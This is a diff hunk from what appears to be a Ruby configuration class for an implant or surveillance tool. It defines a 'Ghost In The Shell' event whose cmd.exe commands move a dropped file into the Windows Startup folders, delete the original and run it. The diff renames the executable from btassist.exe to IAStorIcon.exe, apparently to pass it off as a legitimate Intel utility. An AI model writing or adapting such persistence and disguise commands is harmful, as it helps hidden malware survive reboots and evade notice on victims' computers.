@@ -56,11 +56,11 @@ class Configuration
       "desc"=>"Ghost In The Shell"}
     ghost_action = {"desc"=>"Ghost In The Shell",
       "subactions"=>[
-          {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
-          {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%HOMEPATH%\\Start Menu\\Programs\\Startup\\btassist.exe\""},
+          {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IAStorIcon.exe\""},
+          {"action"=>"execute", "command"=>"cmd.exe /c move $dir$\\ghits \"%HOMEPATH%\\Start Menu\\Programs\\Startup\\IAStorIcon.exe\""},
           {"action"=>"execute", "command"=>"cmd.exe /c del /F $dir$\\ghits"},
-          {"action"=>"execute", "command"=>"\"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\btassist.exe\""},
-          {"action"=>"execute", "command"=>"\"%HOMEPATH%\\Start Menu\\Programs\\Startup\\btassist.exe\""},
+          {"action"=>"execute", "command"=>"\"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\IAStorIcon.exe\""},
+          {"action"=>"execute", "command"=>"\"%HOMEPATH%\\Start Menu\\Programs\\Startup\\IAStorIcon.exe\""},
       ]}
 
     config['events'] << ghost_event
